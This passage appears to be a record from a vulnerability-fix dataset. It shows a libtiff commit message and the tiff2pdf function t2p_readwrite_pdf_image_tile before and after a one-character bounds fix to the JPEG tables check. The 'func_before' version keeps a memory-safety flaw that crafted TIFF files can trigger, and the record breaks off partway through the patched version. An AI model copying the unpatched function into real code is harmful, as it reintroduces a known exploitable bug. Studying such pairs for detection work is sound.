        "commit_text": "t2p_readwrite_pdf_image_tile(). Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2640",
        "func_before": "tsize_t t2p_readwrite_pdf_image_tile(T2P* t2p, TIFF* input, TIFF* output, ttile_t tile){\n\n\tuint16 edge=0;\n\ttsize_t written=0;\n\tunsigned char* buffer=NULL;\n\ttsize_t bufferoffset=0;\n\tunsigned char* samplebuffer=NULL;\n\ttsize_t samplebufferoffset=0;\n\ttsize_t read=0;\n\tuint16 i=0;\n\tttile_t tilecount=0;\n\t/* tsize_t tilesize=0; */\n\tttile_t septilecount=0;\n\ttsize_t septilesize=0;\n#ifdef JPEG_SUPPORT\n\tunsigned char* jpt;\n\tfloat* xfloatp;\n\tuint32 xuint32=0;\n#endif\n\n\t/* Fail if prior error (in particular, can't trust tiff_datasize) */\n\tif (t2p->t2p_error != T2P_ERR_OK)\n\t\treturn(0);\n\n\tedge |= t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\tedge |= t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\n\tif( (t2p->pdf_transcode == T2P_TRANSCODE_RAW) && ((edge == 0)\n#if defined(JPEG_SUPPORT) || defined(OJPEG_SUPPORT)\n\t\t|| (t2p->pdf_compression == T2P_COMPRESS_JPEG)\n#endif\n\t)\n\t){\n#ifdef CCITT_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_G4){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef ZIP_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_ZIP){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef OJPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_OJPEG){\n\t\t\tif(! t2p->pdf_ojpegdata){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"No support for OJPEG image %s with \"\n                                        \"bad tables\", \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tbuffer=(unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\t_TIFFmemcpy(buffer, t2p->pdf_ojpegdata, t2p->pdf_ojpegdatalength);\n\t\t\tif(edge!=0){\n\t\t\t\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[7]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength >> 8) & 0xff;\n\t\t\t\t\tbuffer[8]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength ) & 0xff;\n\t\t\t\t}\n\t\t\t\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[9]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth >> 8) & 0xff;\n\t\t\t\t\tbuffer[10]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth ) & 0xff;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbufferoffset=t2p->pdf_ojpegdatalength;\n\t\t\tbufferoffset+=TIFFReadRawTile(input, \n\t\t\t\t\ttile, \n\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t-1);\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xff;\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xd9;\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n#ifdef JPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_JPEG){\n\t\t\tunsigned char table_end[2];\n\t\t\tuint32 count = 0;\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate \" TIFF_SIZE_FORMAT \" bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n                                          (TIFF_SIZE_T) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n\t\t\t\tif (count >= 4) {\n                                        int retTIFFReadRawTile;\n                    /* Ignore EOI marker of JpegTables */\n\t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);\n\t\t\t\t\tbufferoffset += count - 2;\n                    /* Store last 2 bytes of the JpegTables */\n\t\t\t\t\ttable_end[0] = buffer[bufferoffset-2];\n\t\t\t\t\ttable_end[1] = buffer[bufferoffset-1];\n\t\t\t\t\txuint32 = bufferoffset;\n                                        bufferoffset -= 2;\n                                        retTIFFReadRawTile= TIFFReadRawTile(\n\t\t\t\t\t\tinput, \n\t\t\t\t\t\ttile, \n\t\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t\t-1);\n                                        if( retTIFFReadRawTile < 0 )\n                                        {\n                                            _TIFFfree(buffer);\n                                            t2p->t2p_error = T2P_ERR_ERROR;\n                                            return(0);\n                                        }\n\t\t\t\t\tbufferoffset += retTIFFReadRawTile;\n                    /* Overwrite SOI marker of image scan with previously */\n                    /* saved end of JpegTables */\n\t\t\t\t\tbuffer[xuint32-2]=table_end[0];\n\t\t\t\t\tbuffer[xuint32-1]=table_end[1];\n\t\t\t\t}\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n\t\t(void)0;\n\t}\n\n\tif(t2p->pdf_sample==T2P_SAMPLE_NOTHING){\n\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\tif(buffer==NULL){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Can't allocate %lu bytes of memory for \"\n                                \"t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\tTIFFFileName(input));\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tread = TIFFReadEncodedTile(\n\t\t\tinput, \n\t\t\ttile, \n\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\tt2p->tiff_datasize);\n\t\tif(read==-1){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\ttile, \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t} else {\n\n\t\tif(t2p->pdf_sample == T2P_SAMPLE_PLANAR_SEPARATE_TO_CONTIG){\n\t\t\tseptilesize=TIFFTileSize(input);\n\t\t\tseptilecount=TIFFNumberOfTiles(input);\n\t\t\t/* tilesize=septilesize*t2p->tiff_samplesperpixel; */\n\t\t\ttilecount=septilecount/t2p->tiff_samplesperpixel;\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(samplebuffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebufferoffset=0;\n\t\t\tfor(i=0;i<t2p->tiff_samplesperpixel;i++){\n\t\t\t\tread = \n\t\t\t\t\tTIFFReadEncodedTile(input, \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\t(tdata_t) &(samplebuffer[samplebufferoffset]), \n\t\t\t\t\t\tseptilesize);\n\t\t\t\tif(read==-1){\n\t\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t\t\t_TIFFfree(samplebuffer);\n\t\t\t\t\t\t_TIFFfree(buffer);\n\t\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\t\treturn(0);\n\t\t\t\t}\n\t\t\t\tsamplebufferoffset+=read;\n\t\t\t}\n\t\t\tt2p_sample_planar_separate_to_contig(\n\t\t\t\tt2p,\n\t\t\t\t&(buffer[bufferoffset]),\n\t\t\t\tsamplebuffer, \n\t\t\t\tsamplebufferoffset); \n\t\t\tbufferoffset+=samplebufferoffset;\n\t\t\t_TIFFfree(samplebuffer);\n\t\t}\n\n\t\tif(buffer==NULL){\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tread = TIFFReadEncodedTile(\n\t\t\t\tinput, \n\t\t\t\ttile, \n\t\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\t\tt2p->tiff_datasize);\n\t\t\tif(read==-1){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\ttile, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t_TIFFfree(buffer);\n\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgba_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBAA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgbaa_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_YCBCR_TO_RGB){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"No support for YCbCr to RGB in tile for %s\", \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_LAB_SIGNED_TO_UNSIGNED){\n\t\t\tt2p->tiff_datasize=t2p_sample_lab_signed_to_unsigned(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\t}\n\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) != 0){\n\t\tt2p_tile_collapse_left(\n\t\t\tbuffer, \n\t\t\tTIFFTileRowSize(input),\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth,\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t}\n\n\n\tt2p_disable(output);\n\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, t2p->tiff_photometric);\n\tTIFFSetField(output, TIFFTAG_BITSPERSAMPLE, t2p->tiff_bitspersample);\n\tTIFFSetField(output, TIFFTAG_SAMPLESPERPIXEL, t2p->tiff_samplesperpixel);\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth);\n\t}\n\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t}\n\tTIFFSetField(output, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);\n\tTIFFSetField(output, TIFFTAG_FILLORDER, FILLORDER_MSB2LSB);\n\n\tswitch(t2p->pdf_compression){\n\tcase T2P_COMPRESS_NONE:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_NONE);\n\t\tbreak;\n#ifdef CCITT_SUPPORT\n\tcase T2P_COMPRESS_G4:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4);\n\t\tbreak;\n#endif\n#ifdef JPEG_SUPPORT\n\tcase T2P_COMPRESS_JPEG:\n\t\tif (t2p->tiff_photometric==PHOTOMETRIC_YCBCR) {\n\t\t\tuint16 hor = 0, ver = 0;\n\t\t\tif (TIFFGetField(input, TIFFTAG_YCBCRSUBSAMPLING, &hor, &ver)!=0) {\n\t\t\t\tif (hor != 0 && ver != 0) {\n\t\t\t\t\tTIFFSetField(output, TIFFTAG_YCBCRSUBSAMPLING, hor, ver);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(TIFFGetField(input, TIFFTAG_REFERENCEBLACKWHITE, &xfloatp)!=0){\n\t\t\t\tTIFFSetField(output, TIFFTAG_REFERENCEBLACKWHITE, xfloatp);\n\t\t\t}\n\t\t}\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_JPEG);\n\t\tTIFFSetField(output, TIFFTAG_JPEGTABLESMODE, 0); /* JPEGTABLESMODE_NONE */\n\t\tif(t2p->pdf_colorspace & (T2P_CS_RGB | T2P_CS_LAB)){\n\t\t\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_YCBCR);\n\t\t\tif(t2p->tiff_photometric != PHOTOMETRIC_YCBCR){\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RGB);\n\t\t\t} else {\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RAW);\n\t\t\t}\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_GRAY){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_CMYK){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_JPEGQUALITY, \n\t\t\t\tt2p->pdf_defaultcompressionquality);\n\t\t}\n\t\tbreak;\n#endif\n#ifdef ZIP_SUPPORT\n\tcase T2P_COMPRESS_ZIP:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_DEFLATE);\n\t\tif(t2p->pdf_defaultcompressionquality%100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_PREDICTOR, \n\t\t\t\tt2p->pdf_defaultcompressionquality % 100);\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality/100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_ZIPQUALITY, \n\t\t\t\t(t2p->pdf_defaultcompressionquality / 100));\n\t\t}\n\t\tbreak;\n#endif\n\tdefault:\n\t\tbreak;\n\t}\n\n\tt2p_enable(output);\n\tt2p->outputwritten = 0;\n\tbufferoffset = TIFFWriteEncodedStrip(output, (tstrip_t) 0, buffer,\n\t\t\t\t\t     TIFFStripSize(output)); \n\tif (buffer != NULL) {\n\t\t_TIFFfree(buffer);\n\t\tbuffer = NULL;\n\t}\n\tif (bufferoffset == -1) {\n\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t  \"Error writing encoded tile to output PDF %s\", \n\t\t\t  TIFFFileName(output));\n\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\treturn(0);\n\t}\n\t\n\twritten = t2p->outputwritten;\n\t\n\treturn(written);\n}",
        "func": "tsize_t t2p_readwrite_pdf_image_tile(T2P* t2p, TIFF* input, TIFF* output, ttile_t tile){\n\n\tuint16 edge=0;\n\ttsize_t written=0;\n\tunsigned char* buffer=NULL;\n\ttsize_t bufferoffset=0;\n\tunsigned char* samplebuffer=NULL;\n\ttsize_t samplebufferoffset=0;\n\ttsize_t read=0;\n\tuint16 i=0;\n\tttile_t tilecount=0;\n\t/* tsize_t tilesize=0; */\n\tttile_t septilecount=0;\n\ttsize_t septilesize=0;\n#ifdef JPEG_SUPPORT\n\tunsigned char* jpt;\n\tfloat* xfloatp;\n\tuint32 xuint32=0;\n#endif\n\n\t/* Fail if prior error (in particular, can't trust tiff_datasize) */\n\tif (t2p->t2p_error != T2P_ERR_OK)\n\t\treturn(0);\n\n\tedge |= t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\tedge |= t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile);\n\n\tif( (t2p->pdf_transcode == T2P_TRANSCODE_RAW) && ((edge == 0)\n#if defined(JPEG_SUPPORT) || defined(OJPEG_SUPPORT)\n\t\t|| (t2p->pdf_compression == T2P_COMPRESS_JPEG)\n#endif\n\t)\n\t){\n#ifdef CCITT_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_G4){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef ZIP_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_ZIP){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef OJPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_OJPEG){\n\t\t\tif(! t2p->pdf_ojpegdata){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"No support for OJPEG image %s with \"\n                                        \"bad tables\", \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tbuffer=(unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\t_TIFFmemcpy(buffer, t2p->pdf_ojpegdata, t2p->pdf_ojpegdatalength);\n\t\t\tif(edge!=0){\n\t\t\t\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[7]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength >> 8) & 0xff;\n\t\t\t\t\tbuffer[8]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength ) & 0xff;\n\t\t\t\t}\n\t\t\t\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[9]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth >> 8) & 0xff;\n\t\t\t\t\tbuffer[10]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth ) & 0xff;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbufferoffset=t2p->pdf_ojpegdatalength;\n\t\t\tbufferoffset+=TIFFReadRawTile(input, \n\t\t\t\t\ttile, \n\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t-1);\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xff;\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xd9;\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n#ifdef JPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_JPEG){\n\t\t\tunsigned char table_end[2];\n\t\t\tuint32 count = 0;\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate \" TIFF_SIZE_FORMAT \" bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n                                          (TIFF_SIZE_T) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n\t\t\t\tif (count > 4) {\n                                        int retTIFFReadRawTile;\n                    /* Ignore EOI marker of JpegTables */\n\t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);\n\t\t\t\t\tbufferoffset += count - 2;\n                    /* Store last 2 bytes of the JpegTables */\n\t\t\t\t\ttable_end[0] = buffer[bufferoffset-2];\n\t\t\t\t\ttable_end[1] = buffer[bufferoffset-1];\n\t\t\t\t\txuint32 = bufferoffset;\n                                        bufferoffset -= 2;\n                                        retTIFFReadRawTile= TIFFReadRawTile(\n\t\t\t\t\t\tinput, \n\t\t\t\t\t\ttile, \n\t\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t\t-1);\n                                        if( retTIFFReadRawTile < 0 )\n                                        {\n                                            _TIFFfree(buffer);\n                                            t2p->t2p_error = T2P_ERR_ERROR;\n                                            return(0);\n                                        }\n\t\t\t\t\tbufferoffset += retTIFFReadRawTile;\n                    /* Overwrite SOI marker of image scan with previously */\n                    /* saved end of JpegTables */\n\t\t\t\t\tbuffer[xuint32-2]=table_end[0];\n\t\t\t\t\tbuffer[xuint32-1]=table_end[1];\n\t\t\t\t}\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n\t\t(void)0;\n\t}\n\n\tif(t2p->pdf_sample==T2P_SAMPLE_NOTHING){\n\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\tif(buffer==NULL){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Can't allocate %lu bytes of memory for \"\n                                \"t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\tTIFFFileName(input));\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tread = TIFFReadEncodedTile(\n\t\t\tinput, \n\t\t\ttile, \n\t\t\t(tdata_t) &buffer[bufferoffset], 